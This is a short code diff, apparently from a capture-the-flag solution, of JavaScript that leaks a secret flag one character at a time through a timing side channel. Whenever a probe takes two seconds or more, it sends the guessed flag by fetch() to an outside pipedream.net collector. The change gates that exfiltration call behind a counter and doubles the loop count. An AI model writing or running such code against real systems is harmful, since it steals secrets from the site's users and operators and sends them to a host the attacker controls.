@@ -42,12 +42,13 @@
                     if (time >= 2000) {
                         //fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?lettre=${alpha[i]}&temps=${time}ms`)
                         flag = flag + alpha[i];
-                        fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?flag=${flag}`)
+                        if (cnt > 5)
+                            fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?flag=${flag}`)
                     }
                 });
             }
         }
-        while (cnt != 5) {
+        while (cnt != 10) {
             test()
             cnt++
         }
